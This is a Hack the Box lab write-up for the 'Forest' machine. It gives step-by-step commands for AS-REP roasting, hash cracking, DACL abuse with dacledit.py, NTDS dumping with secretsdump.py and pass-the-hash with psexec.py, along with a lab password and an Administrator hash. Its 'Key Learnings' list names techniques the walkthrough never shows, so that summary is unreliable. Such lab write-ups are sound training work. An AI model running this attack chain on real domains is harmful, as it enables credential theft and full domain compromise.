# Forest

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Easy**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan

<img width="719" height="1009" alt="image" src="https://github.com/user-attachments/assets/6fff85b0-bd86-4e80-a1eb-a5faa5a6ea4f" />

2. Nmap reveals we're dealing with a Domain Controller. Since we are not given initial credentials, attempt to get hashes via ASREProasting attack using Impacket's GetNPUsers.py script

`GetNPUsers.py -request -format hashcat -outputfile asreproastables.txt -dc-ip 10.129.95.210 'htb.local/'`

<img width="721" height="123" alt="image" src="https://github.com/user-attachments/assets/b7257a49-3010-43a5-b68a-c3dbad6b2352" />

3. Crack hash using hashcat to get svc-alfresco's plaintext password

`hashcat -m 18200 asreproastables.txt /usr/share/wordlists/rockyou.txt`

4. With svc-alfresco's credentials, run Bloodhound

`sudo bloodhound-python -d htb.local -u svc-alfresco -p $(cat ../svc-alfresco.password) -ns 10.129.95.210 -c all`

5. Bloodhound shows svc-alfresco user has WriteDacl permissions on the domain.

<img width="1157" height="375" alt="image" src="https://github.com/user-attachments/assets/418e40ba-cea6-4c3a-8c4f-d11b55b1f959" />

6. To exploit WriteDacl permission, first add svc-alfresco user to WINDOWS EXCHANGE PERMISSIONS group using net rpc

`net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" 'svc-alfresco' -U "htb.local"/'svc-alfresco' -S dc01.htb.local`

7. Then give svc-alfresco user FullControl rights using Impacket's dacledit.py script

`dacledit.py -action 'write' -rights 'FullControl' -principal 'svc-alfresco' -dc-ip dc01.htb.local -target-sid 'S-1-5-21-3072663084-364016917-1341370565' 'htb.local'/'svc-alfresco':'s3rvice'`

8. Since we have FullControl over the HTB.LOCAL domain, we can dump the NTDS.dit using secretsdump.py

`secretsdump.py "htb.local"/'svc-alfresco':'s3rvice'@10.129.95.210`

9. This gives us the Administrator's NTLM hash that we can pass to gain remote code execution using psexec.py

`psexec.py htb.local/administrator@10.129.95.210 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'`

10. Rooted machine!

